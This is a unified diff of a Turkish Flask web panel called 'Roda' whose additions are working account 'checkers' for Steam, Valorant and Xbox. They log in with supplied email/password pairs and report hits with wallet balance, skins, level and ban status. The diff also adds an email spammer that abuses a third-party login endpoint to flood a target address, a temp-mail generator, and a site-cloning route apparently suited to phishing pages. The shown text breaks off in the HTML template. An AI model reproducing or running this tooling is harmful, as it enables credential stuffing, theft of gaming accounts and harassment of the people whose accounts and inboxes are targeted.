@@ -1,21 +1,26 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Roda - API Discovery + Checker (Türkçe)
-Admin/Üye ayrımı | Key sistemi (1 Key 1 IP + Tek Kullanım) | Sabit menü | Ayrıştırma (2 Mod) | Log Sistemi | Webhook
-Tüm checker'lar eklendi: Xbox, Wolfteam, Craftrise, Hotmail, Token, TikTok, Tabii
+Roda - TÜM CHECKER'LAR TEK YERDE
+Admin/Üye ayrımı | 1 Key 1 IP | Loglar | Webhook | Kar Taneleri
+Xbox, Steam, Valorant, Tabii, Wolfteam, Craftrise, Hotmail, Token, TikTok Gen, Site Kopyala, Temp Mail, Email Spammer
 """
 
 import os, json, re, time, random, string, threading, webbrowser, base64, concurrent.futures, urllib3
 from datetime import datetime, timedelta
 from urllib.parse import urljoin, urlparse, parse_qs, quote
 import requests
-from flask import Flask, request, jsonify, Response
+from flask import Flask, request, jsonify, Response, send_file
 from bs4 import BeautifulSoup
 from user_agent import generate_user_agent
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_v1_5
+import jwt
+import io
 
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
+urllib3.disable_warnings()
 
 # ============================================================
 # MASTER KEY (ENV'DEN AL, KODDA YOK)
@@ -40,7 +45,7 @@ def add_log(message, level="INFO"):
     print(f"[{timestamp}] [{level}] {message}")
 
 # ============================================================
-# KEY FONKSİYONLARI (1 KEY 1 IP + TEK KULLANIM - AMA KEYLER KALICI)
+# KEY FONKSİYONLARI (1 KEY 1 IP + TEK KULLANIM)
 # ============================================================
 def load_keys():
     if os.path.exists(KEYS_FILE):
@@ -76,22 +81,24 @@ def is_key_valid(key):
     if bound_ip and bound_ip != client_ip:
         add_log(f"IP eşleşmedi! Key: {key}, Beklenen: {bound_ip}, Gelen: {client_ip}", "WARNING")
         return False, None, None
-    # KULLANIM KONTROLÜNÜ KALDIRIYORUZ - KEYLER KALICI OLACAK
-    # if entry.get("used", False):
-    #     add_log(f"Key zaten kullanılmış: {key}", "WARNING")
-    #     return False, None, None
+    if entry.get("used", False):
+        add_log(f"Key zaten kullanılmış: {key}", "WARNING")
+        return False, None, None
     return True, entry.get("note", "Kullanıcı"), entry
 
 def mark_key_used(key):
-    # Kullanım işaretlemesini pas geçiyoruz, keyler kalıcı
-    pass
+    keys = load_keys()
+    if key in keys:
+        keys[key]["used"] = True
+        keys[key]["used_at"] = datetime.now().isoformat()
+        save_keys(keys)
 
 def is_admin(key):
     valid, role, _ = is_key_valid(key)
     return valid and role == "Admin"
 
 # ============================================================
-# PLATFORMLAR (TÜM CHECKER'LAR)
+# PLATFORMLAR
 # ============================================================
 PLATFORMS = [
     {"name": "YouTube", "domain": "youtube.com", "icon": "fa-brands fa-youtube"},
@@ -116,10 +123,11 @@ PLATFORMS = [
     {"name": "Hotmail", "domain": "outlook.com", "icon": "fa-solid fa-envelope"},
     {"name": "Token Check", "domain": "discord.com", "icon": "fa-solid fa-key"},
     {"name": "Tabii", "domain": "tabii.com", "icon": "fa-solid fa-tv"},
+    {"name": "Valorant", "domain": "valorant.com", "icon": "fa-solid fa-crosshairs"},
 ]
 
 # ============================================================
-# TÜM CHECKER FONKSİYONLARI (KISALTTIM, UZUN KOD TEKRARINA GEREK YOK)
+# CHECKER FONKSİYONLARI
 # ============================================================
 
 # ---- TABII ----
@@ -186,7 +194,7 @@ def check_tabii_account(email, password, proxy=None):
         session.close()
     return result
 
-# ---- XBOX & MC ----
+# ---- XBOX ----
 def check_xbox_account(email, password):
     session = requests.Session()
     session.verify = False
@@ -206,8 +214,236 @@ def check_xbox_account(email, password):
         if '#' in login_req.url:
             ms_token = parse_qs(urlparse(login_req.url).fragment).get('access_token', ["None"])[0]
             if ms_token != "None":
+                try:
+                    xbox_token, uhs = get_xbox_token(session, ms_token)
+                    if xbox_token and uhs:
+                        xsts = get_xsts_token(session, xbox_token)
+                        if xsts:
+                            profile = get_xbox_profile(session, uhs, xsts)
+                            gamertag = profile.get("gamertag", "N/A")
+                            tier = profile.get("tier", "N/A")
+                            return {"status": "HIT", "message": f"Xbox/MC | Gamertag: {gamertag} | Tier: {tier}", "details": {"gamertag": gamertag, "tier": tier}}
+                except:
+                    pass
                 return {"status": "HIT", "message": f"Xbox/MC giriş başarılı", "details": {"token": ms_token[:20] + "..."}}
         return {"status": "CUSTOM", "message": "Bağlı değil/Xbox yok"}
+    except Exception as e:
+        return {"status": "ERROR", "message": str(e)[:60]}
+
+def get_xbox_token(session, ms_token):
+    try:
+        payload = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
+        resp = session.post('https://user.auth.xboxlive.com/user/authenticate', json=payload, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=10)
+        if resp.status_code == 200:
+            data = resp.json()
+            return data.get('Token'), data['DisplayClaims']['xui'][0]['uhs']
+    except:
+        pass
+    return None, None
+
+def get_xsts_token(session, xbox_token):
+    try:
+        payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
+        resp = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json=payload, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=10)
+        if resp.status_code == 200:
+            return resp.json().get('Token')
+    except:
+        pass
+    return None
+
+def get_xbox_profile(session, uhs, xsts_token):
+    try:
+        auth_header = f"XBL3.0 x={uhs};{xsts_token}"
+        resp = session.get("https://profile.xboxlive.com/users/me/profile/settings?settings=Gamertag,GameDisplayPicRaw,AccountTier,XboxOneRep", headers={"Authorization": auth_header, "x-xbl-contract-version": "2", "Accept": "application/json"}, timeout=10)
+        if resp.status_code == 200:
+            data = resp.json()
+            settings = {s["id"]: s.get("value", "N/A") for s in data.get("profileUsers", [{}])[0].get("settings", [])}
+            return {"gamertag": settings.get("Gamertag", "N/A"), "tier": settings.get("AccountTier", "N/A")}
+    except:
+        pass
+    return {"gamertag": "N/A", "tier": "N/A"}
+
+# ---- STEAM ----
+def check_steam_account(email, password):
+    try:
+        session = requests.Session()
+        session.headers.update({
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
+            "Accept-Language": "en-US,en;q=0.9",
+        })
+        # RSA Key al
+        rsa_resp = session.get("https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1/", params={"account_name": email}, timeout=10).json()
+        rsa_data = rsa_resp["response"]
+        key = RSA.construct((int(rsa_data["publickey_mod"], 16), int(rsa_data["publickey_exp"], 16)))
+        enc_pwd = base64.b64encode(PKCS1_v1_5.new(key).encrypt(password.encode())).decode()
+        
+        # Login
+        login_resp = session.post("https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1/",
+            data={"account_name": email, "encrypted_password": enc_pwd, "encryption_timestamp": rsa_data["timestamp"],
+                  "remember_login": "true", "website_id": "Community", "device_friendly_name": "Chrome Browser"}, timeout=10).json().get("response", {})
+        steamid = login_resp.get("steamid")
+        if not steamid:
+            return {"status": "BAD", "message": "Giriş başarısız"}
+        guard_types = [c.get("confirmation_type", 0) for c in login_resp.get("allowed_confirmations", [])]
+        if any(t in (3, 4) for t in guard_types):
+            return {"status": "2FA", "message": "2FA gerekli"}
+        
+        time.sleep(0.5)
+        poll = session.post("https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1/",
+            data={"client_id": login_resp["client_id"], "request_id": login_resp["request_id"]}, timeout=10).json().get("response", {})
+        access_token = poll.get("access_token")
+        if not access_token:
+            return {"status": "BAD", "message": "Token alınamadı"}
+        
+        # Profil bilgileri
+        profile_resp = session.get("https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/", params={"access_token": access_token, "steamids": steamid}, timeout=10)
+        profile_data = profile_resp.json().get("response", {}).get("players", [{}])[0] if profile_resp.status_code == 200 else {}
+        
+        # Level
+        level_resp = session.get("https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/", params={"access_token": access_token, "steamid": steamid}, timeout=10)
+        level = level_resp.json().get("response", {}).get("player_level", "?") if level_resp.status_code == 200 else "?"
+        
+        # VAC
+        ban_resp = session.get("https://api.steampowered.com/ISteamUser/GetPlayerBans/v1/", params={"access_token": access_token, "steamids": steamid}, timeout=10)
+        ban_data = ban_resp.json().get("players", [{}])[0] if ban_resp.status_code == 200 else {}
+        vac_banned = ban_data.get("VACBanned", False)
+        vac_count = ban_data.get("NumberOfVACBans", 0)
+        
+        # Bakiye
+        balance = "—"
+        try:
+            bal_resp = session.get("https://store.steampowered.com/api/getWalletBalance/", params={"steamid": steamid}, timeout=8)
+            if bal_resp.status_code == 200:
+                bal_data = bal_resp.json()
+                if bal_data.get("success"):
+                    balance = bal_data.get("formattedBalance", "—")
+        except: pass
+        
+        # Ülke
+        country = profile_data.get("loccountrycode", "—")
+        profile_name = profile_data.get("personaname", "?")
+        
+        details = {
+            "steamid": steamid,
+            "profile_name": profile_name,
+            "level": level,
+            "country": country,
+            "balance": balance,
+            "vac_banned": vac_banned,
+            "vac_count": vac_count,
+            "profile_url": profile_data.get("profileurl", ""),
+        }
+        return {"status": "HIT", "message": f"{profile_name} | Lvl:{level} | Ülke:{country} | Bakiye:{balance} | VAC:{vac_count} ban", "details": details}
+    except Exception as e:
+        return {"status": "ERROR", "message": str(e)[:60]}
+
+# ---- VALORANT ----
+def check_valorant_account(email, password):
+    try:
+        session = requests.Session()
+        session.headers.update({
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
+            "Content-Type": "application/json",
+            "Accept": "application/json"
+        })
+        # Authorize
+        r = session.post("https://auth.riotgames.com/api/v1/authorization", json={
+            "client_id": "riot-client",
+            "nonce": "1",
+            "redirect_uri": "http://localhost/redirect",
+            "response_type": "token id_token",
+            "scope": "openid link ban account email mobile_number"
+        }, timeout=10)
+        if r.status_code != 200:
+            return {"status": "BAD", "message": "Auth başarısız"}
+        
+        # Login
+        r = session.put("https://auth.riotgames.com/api/v1/authorization", json={
+            "type": "auth",
+            "username": email,
+            "password": password,
+            "remember": False
+        }, timeout=10)
+        if r.status_code != 200:
+            return {"status": "BAD", "message": "Sunucu hatası"}
+        data = r.json()
+        if "error" in data:
+            if "multifactor" in str(data):
+                return {"status": "2FA", "message": "2FA gerekli"}
+            return {"status": "BAD", "message": data.get("error", "Giriş reddedildi")}
+        
+        # Token al
+        if "response" in data and "parameters" in data["response"]:
+            uri = data["response"]["parameters"]["uri"]
+            if "access_token=" in uri:
+                token = uri.split("access_token=")[1].split("&")[0]
+                session.headers.update({"Authorization": f"Bearer {token}"})
+            else:
+                return {"status": "BAD", "message": "Token alınamadı"}
+        else:
+            return {"status": "BAD", "message": "Token alınamadı"}
+        
+        # User Info
+        r = session.get("https://auth.riotgames.com/userinfo", timeout=10)
+        if r.status_code == 200:
+            ui = r.json()
+            puuid = ui.get("sub", "")
+            riot_id = ui.get("acct", {}).get("game_name", "") + "#" + ui.get("acct", {}).get("tag_line", "")
+        
+        # Entitlements
+        r = session.post("https://entitlements.auth.riotgames.com/api/token/v1", json={}, timeout=10)
+        if r.status_code == 200:
+            ent = r.json()
+            if ent.get("entitlements_token"):
+                session.headers.update({"X-Riot-Entitlements-JWT": ent["entitlements_token"]})
+        
+        # Bölge
+        region = "eu"
+        try:
+            r = session.get("https://riot-geo.pas.si.riotgames.com/pas/v1/service/valorant", timeout=10)
+            if r.status_code == 200:
+                region = r.json().get("affinity", "eu")
+        except: pass
+        
+        if not puuid:
+            return {"status": "BAD", "message": "PUUID alınamadı"}
+        
+        # Level
+        level = "?"
+        try:
+            r = session.get(f"https://pd.{region}.a.pvp.net/account-xp/v1/players/{puuid}", timeout=10)
+            if r.status_code == 200:
+                level = r.json().get("progress", {}).get("level", "?")
+        except: pass
+        
+        # Wallet
+        vp, rp = "?", "?"
+        try:
+            r = session.get(f"https://pd.{region}.a.pvp.net/store/v1/wallet/{puuid}", timeout=10)
+            if r.status_code == 200:
+                w = r.json()
+                vp = w.get("Balances", {}).get("85ad13f7-3d1b-5128-9eb2-7cd8ee0b5741", "0")
+                rp = w.get("Balances", {}).get("e59aa87c-4cbf-517a-5983-6e81511be9b7", "0")
+        except: pass
+        
+        # Skin count
+        skins = "?"
+        try:
+            r = session.get(f"https://pd.{region}.a.pvp.net/store/v1/entitlements/{puuid}/e7c63390-eda7-46e0-bb7a-a6abdacd2433", timeout=10)
+            if r.status_code == 200:
+                skins = len(r.json().get("Entitlements", []))
+        except: pass
+        
+        details = {
+            "puuid": puuid,
+            "riot_id": riot_id,
+            "region": region,
+            "level": level,
+            "vp": vp,
+            "rp": rp,
+            "skins": skins,
+        }
+        return {"status": "HIT", "message": f"{riot_id} | Lvl:{level} | VP:{vp} | Skin:{skins}", "details": details}
     except Exception as e:
         return {"status": "ERROR", "message": str(e)[:60]}
 
@@ -272,7 +508,7 @@ def check_hotmail_account(email, password):
     except Exception as e:
         return {"status": "ERROR", "message": str(e)[:60]}
 
-# ---- TOKEN CHECK ----
+# ---- TOKEN ----
 def check_token(token_type, token):
     if token_type == "discord":
         headers = {"Authorization": token}
@@ -580,6 +816,62 @@ class APIScanner:
             pass
 
 # ============================================================
+# TEMP MAIL
+# ============================================================
+def generate_temp_mail():
+    try:
+        dom_res = requests.get("https://api.mail.tm/domains", timeout=10).json()
+        domain = dom_res['hydra:member'][0]['domain']
+        user = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+        password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
+        email = f"{user}@{domain}"
+        create_payload = {"address": email, "password": password}
+        requests.post("https://api.mail.tm/accounts", json=create_payload, timeout=10)
+        token_res = requests.post("https://api.mail.tm/token", json=create_payload, timeout=10).json()
+        token = token_res['token']
+        return {"success": True, "email": email, "password": password, "token": token}
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+def get_temp_mail_messages(token):
+    try:
+        headers = {"Authorization": f"Bearer {token}"}
+        res = requests.get("https://api.mail.tm/messages", headers=headers, timeout=10)
+        if res.status_code == 200:
+            return {"success": True, "messages": res.json().get('hydra:member', [])}
+        return {"success": False, "error": f"Sunucu Hatası: {res.status_code}"}
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+def read_temp_mail(token, msg_id):
+    try:
+        headers = {"Authorization": f"Bearer {token}"}
+        res = requests.get(f"https://api.mail.tm/messages/{msg_id}", headers=headers, timeout=10)
+        if res.status_code == 200:
+            return {"success": True, "message": res.json()}
+        return {"success": False, "error": f"Mesaj Alınamadı: {res.status_code}"}
+    except Exception as e:
+        return {"success": False, "error": str(e)}
+
+# ---- EMAIL SPAMMER ----
+def send_spam_email(target_email):
+    try:
+        headers = {
+            'authority': 'api.kidzapp.com',
+            'accept': 'application/json',
+            'content-type': 'application/json',
+            'user-agent': generate_user_agent()
+        }
+        data = {'email': target_email, 'sdk': 'web', 'platform': 'desktop'}
+        res = requests.post('https://api.kidzapp.com/api/3.0/customlogin/', headers=headers, json=data, timeout=5)
+        if '"message":"EMAIL SENT"' in res.text:
+            return {"success": True, "message": "Paket iletildi"}
+        else:
+            return {"success": False, "message": "Sunucu isteği reddetti"}
+    except Exception as e:
+        return {"success": False, "message": str(e)[:60]}
+
+# ============================================================
 # FLASK ROTALARI
 # ============================================================
 @app.route("/")
@@ -597,7 +889,7 @@ def login():
             keys = load_keys()
             keys[key]["bound_ip"] = client_ip
             save_keys(keys)
-        # mark_key_used kaldırıldı
+        mark_key_used(key)
         add_log(f"Giriş başarılı: {key[:4]}... (IP: {client_ip}, Rol: {role})", "SUCCESS")
         return jsonify({"success": True, "user": role, "isAdmin": role == "Admin"})
     else:
@@ -631,6 +923,26 @@ def xbox_check():
     if not email or not password:
         return jsonify({"error": "Eksik"}), 400
     result = check_xbox_account(email, password)
+    return jsonify(result)
+
+@app.route("/api/steam_check", methods=["POST"])
+def steam_check():
+    data = request.json
+    email = data.get("email", "").strip()
+    password = data.get("password", "").strip()
+    if not email or not password:
+        return jsonify({"error": "Eksik"}), 400
+    result = check_steam_account(email, password)
+    return jsonify(result)
+
+@app.route("/api/valorant_check", methods=["POST"])
+def valorant_check():
+    data = request.json
+    email = data.get("email", "").strip()
+    password = data.get("password", "").strip()
+    if not email or not password:
+        return jsonify({"error": "Eksik"}), 400
+    result = check_valorant_account(email, password)
     return jsonify(result)
 
 @app.route("/api/wolfteam_check", methods=["POST"])
@@ -688,6 +1000,53 @@ def tiktok_gen_random():
     username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
     result = check_tiktok_username(username)
     return jsonify({"username": username, "result": result})
+
+# ---- TEMP MAIL ROUTE'LARI ----
+@app.route("/api/temp_mail_generate", methods=["POST"])
+def temp_mail_generate():
+    key = request.args.get("key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+    result = generate_temp_mail()
+    return jsonify(result)
+
+@app.route("/api/temp_mail_refresh", methods=["POST"])
+def temp_mail_refresh():
+    key = request.args.get("key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+    data = request.json
+    token = data.get("token", "")
+    if not token:
+        return jsonify({"error": "Token gerekli"}), 400
+    result = get_temp_mail_messages(token)
+    return jsonify(result)
+
+@app.route("/api/temp_mail_read", methods=["POST"])
+def temp_mail_read():
+    key = request.args.get("key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+    data = request.json
+    token = data.get("token", "")
+    msg_id = data.get("msg_id", "")
+    if not token or not msg_id:
+        return jsonify({"error": "Token ve msg_id gerekli"}), 400
+    result = read_temp_mail(token, msg_id)
+    return jsonify(result)
+
+# ---- EMAIL SPAMMER ROUTE ----
+@app.route("/api/spam_send", methods=["POST"])
+def spam_send():
+    key = request.args.get("key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+    data = request.json
+    email = data.get("email", "").strip()
+    if not email:
+        return jsonify({"error": "Email gerekli"}), 400
+    result = send_spam_email(email)
+    return jsonify(result)
 
 @app.route("/api/scan", methods=["GET"])
 def scan():
@@ -792,7 +1151,48 @@ def fetch_proxies_route():
         return jsonify({"success": False, "error": str(e)})
 
 # ============================================================
-# HTML (MAVİ TEMA + KAR TANELERİ + AYRIŞTIRMA DÜZELTİLDİ + ADMIN ÖZEL ALAN)
+# SİTE KOPYALA (ADMIN)
+# ============================================================
+@app.route("/api/sitecopy", methods=["POST"])
+def sitecopy():
+    key = request.args.get("key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+
+    data = request.json
+    url = data.get("url", "").strip()
+    if not url:
+        return jsonify({"error": "URL gerekli"}), 400
+
+    if not url.startswith(('http://', 'https://')):
+        url = 'https://' + url
+
+    try:
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
+        }
+        resp = requests.get(url, headers=headers, timeout=15)
+        resp.raise_for_status()
+        soup = BeautifulSoup(resp.text, 'html.parser')
+
+        base_tag = soup.new_tag('base', href=url)
+        if soup.head:
+            soup.head.insert(0, base_tag)
+        else:
+            new_head = soup.new_tag('head')
+            new_head.append(base_tag)
+            soup.html.insert(0, new_head)
+
+        html_content = soup.prettify()
+        add_log(f"Site kopyalandı: {url}", "SUCCESS")
+        return Response(html_content, mimetype='text/html', headers={'Content-Disposition': f'attachment; filename="kopyalanan_site.html"'})
+    except Exception as e:
+        add_log(f"Site kopyalama hatası: {url} - {str(e)}", "ERROR")
+        return jsonify({"error": str(e)}), 500
+
+# ============================================================
+# HTML (MAVİ TEMA + KAR TANELERİ + TÜM ÖZELLİKLER)
 # ============================================================
 HTML_TEMPLATE = r"""
 <!DOCTYPE html>
@@ -807,54 +1207,12 @@ HTML_TEMPLATE = r"""
 *{margin:0;padding:0;box-sizing:border-box;font-family:Outfit,sans-serif}
 body{background:#0a0e1a;color:#e8edf5;height:100vh;overflow:hidden;display:flex}
 :root{--p:#3b82f6;--p2:#6366f1;--g:#10b981;--r:#ef4444;--card:#0f172a;--border:rgba(59,130,246,0.2);--bg:#0a0e1a;--sidebar:#020617;--text:#e8edf5;--muted:#94a3b8;--gold:#fbbf24}
-
-/* ===== KAR TANELERİ ARKA PLAN ===== */
-#snow-container {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    pointer-events: none;
-    z-index: 0;
-    overflow: hidden;
-}
-.snowflake {
-    position: absolute;
-    top: -10px;
-    color: rgba(255, 255, 255, 0.6);
-    font-size: 14px;
-    animation: fall linear infinite;
-    pointer-events: none;
-}
-@keyframes fall {
-    0% { transform: translateY(0) rotate(0deg); opacity: 1; }
-    100% { transform: translateY(110vh) rotate(360deg); opacity: 0.2; }
-}
-.snowflake:nth-child(1) { left: 5%; animation-duration: 12s; font-size: 10px; opacity: 0.5; }
-.snowflake:nth-child(2) { left: 15%; animation-duration: 8s; font-size: 14px; opacity: 0.7; }
-.snowflake:nth-child(3) { left: 25%; animation-duration: 15s; font-size: 12px; opacity: 0.4; }
-.snowflake:nth-child(4) { left: 35%; animation-duration: 10s; font-size: 18px; opacity: 0.6; }
-.snowflake:nth-child(5) { left: 45%; animation-duration: 13s; font-size: 11px; opacity: 0.5; }
-.snowflake:nth-child(6) { left: 55%; animation-duration: 9s; font-size: 16px; opacity: 0.7; }
-.snowflake:nth-child(7) { left: 65%; animation-duration: 14s; font-size: 13px; opacity: 0.4; }
-.snowflake:nth-child(8) { left: 75%; animation-duration: 11s; font-size: 15px; opacity: 0.6; }
-.snowflake:nth-child(9) { left: 85%; animation-duration: 16s; font-size: 10px; opacity: 0.5; }
-.snowflake:nth-child(10) { left: 95%; animation-duration: 7s; font-size: 17px; opacity: 0.7; }
-.snowflake:nth-child(11) { left: 10%; animation-duration: 18s; font-size: 9px; opacity: 0.3; }
-.snowflake:nth-child(12) { left: 20%; animation-duration: 6s; font-size: 20px; opacity: 0.8; }
-.snowflake:nth-child(13) { left: 30%; animation-duration: 17s; font-size: 10px; opacity: 0.4; }
-.snowflake:nth-child(14) { left: 40%; animation-duration: 9s; font-size: 14px; opacity: 0.6; }
-.snowflake:nth-child(15) { left: 50%; animation-duration: 12s; font-size: 16px; opacity: 0.5; }
-.snowflake:nth-child(16) { left: 60%; animation-duration: 8s; font-size: 11px; opacity: 0.7; }
-.snowflake:nth-child(17) { left: 70%; animation-duration: 14s; font-size: 18px; opacity: 0.4; }
-.snowflake:nth-child(18) { left: 80%; animation-duration: 10s; font-size: 13px; opacity: 0.6; }
-.snowflake:nth-child(19) { left: 90%; animation-duration: 15s; font-size: 15px; opacity: 0.5; }
-.snowflake:nth-child(20) { left: 98%; animation-duration: 7s; font-size: 12px; opacity: 0.7; }
-
-/* ===== LAYOUT ===== */
+/* KAR TANELERİ */
+.snowflakes{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0;overflow:hidden}
+.snowflake{position:absolute;color:#fff;font-size:1.5em;top:-10%;animation:fall linear infinite;opacity:0.7}
+@keyframes fall{0%{transform:translateY(0) rotate(0deg) scale(0.5);opacity:0.8}100%{transform:translateY(110vh) rotate(720deg) scale(1.2);opacity:0.2}}
 #login-screen{position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;background:var(--bg);background-image:radial-gradient(circle at 30% 40%, rgba(59,130,246,0.08),transparent 50%),radial-gradient(circle at 70% 60%, rgba(99,102,241,0.08),transparent 50%)}
-#login-box{width:420px;padding:45px 40px;text-align:center;background:var(--card);border:1px solid var(--border);border-radius:28px;box-shadow:0 30px 60px rgba(0,0,0,0.5);position:relative;z-index:10000}
+#login-box{width:420px;padding:45px 40px;text-align:center;background:var(--card);border:1px solid var(--border);border-radius:28px;box-shadow:0 30px 60px rgba(0,0,0,0.5);z-index:10}
 #login-box .logo i{font-size:56px;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
 #login-box h1{font-size:28px;font-weight:900;letter-spacing:1px;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
 #login-box .sub{color:var(--muted);margin-bottom:25px;font-size:14px}
@@ -864,7 +1222,7 @@ body{background:#0a0e1a;color:#e8edf5;height:100vh;overflow:hidden;display:flex}
 .btn:hover{transform:translateY(-2px);box-shadow:0 12px 24px rgba(59,130,246,0.25)}
 .btn.sm{width:auto;padding:8px 16px;font-size:12px}
 .btn.g{background:var(--g)}.btn.r{background:var(--r)}.btn.b{background:#1a73e8}
-#sidebar{width:260px;min-width:260px;background:var(--sidebar);border-right:1px solid var(--border);display:flex;flex-direction:column;height:100vh;overflow-y:auto;position:relative;z-index:1}
+#sidebar{width:260px;min-width:260px;background:var(--sidebar);border-right:1px solid var(--border);display:flex;flex-direction:column;height:100vh;overflow-y:auto;position:relative;z-index:2}
 .sidebar-header{padding:18px 20px;text-align:center;border-bottom:1px solid var(--border)}
 .sidebar-header .logo-text{font-size:24px;font-weight:900;letter-spacing:2px;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
 .sidebar-header .version{font-size:10px;color:var(--muted);letter-spacing:1px;margin-top:2px}
@@ -874,6 +1232,7 @@ body{background:#0a0e1a;color:#e8edf5;height:100vh;overflow:hidden;display:flex}
 .nav-item:hover{background:rgba(59,130,246,0.06);color:#fff}
 .nav-item.active{background:rgba(59,130,246,0.12);color:var(--p);border-left:3px solid var(--p)}
 .nav-item i{font-size:16px;width:22px;text-align:center}
+.nav-divider-admin{padding:8px 12px;font-size:10px;color:#475569;text-transform:uppercase;letter-spacing:1px;font-weight:700;margin-top:6px;border-top:1px solid var(--border)}
 .sidebar-stats{padding:10px 14px;border-top:1px solid var(--border);display:flex;flex-wrap:wrap;gap:6px}
 .mini-stat{flex:1;min-width:44%;background:var(--card);padding:6px 4px;border-radius:8px;text-align:center;border:1px solid rgba(255,255,255,0.03)}
 .mini-stat .val{font-size:14px;font-weight:800;color:var(--text)}
@@ -974,7 +1333,7 @@ input:checked+.slider:before{transform:translateX(18px)}
 .hit-filter{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:6px}
 .hit-filter select{padding:4px 10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:6px;color:#fff;font-size:12px;outline:none}
 .hit-filter select:focus{border-color:var(--p)}
-/* AYRIŞTIRMA (DÜZELTİLDİ) */
+/* AYRIŞTIRMA */
 .parse-area{display:flex;flex-direction:column;gap:10px}
 .parse-area textarea{width:100%;height:180px;padding:10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:12px;font-family:monospace;resize:vertical;outline:none}
 .parse-area textarea:focus{border-color:var(--p)}
@@ -982,26 +1341,6 @@ input:checked+.slider:before{transform:translateX(18px)}
 .parse-result{max-height:200px;overflow-y:auto;background:rgba(0,0,0,0.2);border:1px solid var(--border);border-radius:8px;padding:8px}
 .parse-result .parse-line{padding:2px 6px;font-size:12px;font-family:monospace;color:#c8d0dc}
 .parse-result .parse-count{color:var(--g);font-weight:600;font-size:13px}
-/* Admin özel alan ayırıcı */
-.admin-divider {
-    border: none;
-    border-top: 2px dashed var(--p);
-    margin: 16px 0;
-    color: var(--muted);
-    text-align: center;
-    font-size: 12px;
-    letter-spacing: 2px;
-    position: relative;
-}
-.admin-divider::before {
-    content: "⚡ ADMIN ÖZEL ⚡";
-    background: var(--card);
-    padding: 0 12px;
-    position: relative;
-    top: -8px;
-    color: var(--gold);
-    font-weight: 700;
-}
 .discovery-platforms{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:8px}
 .discovery-platforms button{padding:4px 12px;background:rgba(59,130,246,0.06);border:1px solid rgba(59,130,246,0.1);border-radius:6px;color:#94a3b8;font-size:11px;cursor:pointer;transition:0.2s}
 .discovery-platforms button:hover{background:rgba(59,130,246,0.12);border-color:var(--p);color:#fff}
@@ -1011,30 +1350,8 @@ input:checked+.slider:before{transform:translateX(18px)}
 </head>
 <body>
 <!-- KAR TANELERİ -->
-<div id="snow-container">
-    <div class="snowflake">❄</div>
-    <div class="snowflake">❄</div>
-    <div class="snowflake">❄</div>
-    <div class="snowflake">❄</div>
-    <div class="snowflake">❄</div>
-    <div class="snowflake">❄</div>
-    <div class="snowflake">❄</div>
-    <div class="snowflake">❄</div>
-    <div class="snowflake">❄</div>
-    <div class="snowflake">❄</div>
-    <div class="snowflake">❄</div>
-    <div class="snowflake">❄</div>
-    <div class="snowflake">❄</div>
-    <div class="snowflake">❄</div>
-    <div class="snowflake">❄</div>
-    <div class="snowflake">❄</div>
-    <div class="snowflake">❄</div>
-    <div class="snowflake">❄</div>
-    <div class="snowflake">❄</div>
-    <div class="snowflake">❄</div>
-</div>
+<div class="snowflakes" id="snowContainer"></div>
 
-<!-- LOGIN -->
 <div id="login-screen">
 <div id="login-box">
 <div class="logo"><i class="fa-solid fa-crown"></i></div>
@@ -1046,18 +1363,23 @@ input:checked+.slider:before{transform:translateX(18px)}
 </div>
 </div>
 
-<!-- SIDEBAR -->
 <div id="sidebar">
 <div class="sidebar-header"><div class="logo-text">RODA</div><div class="version">v3.0</div></div>
 <div class="sidebar-nav">
 <div class="nav-divider">📁 MENÜ</div>
 <div class="nav-item active" data-page="checker" onclick="switchPage('checker')"><i class="fa-solid fa-check-double"></i> Checker</div>
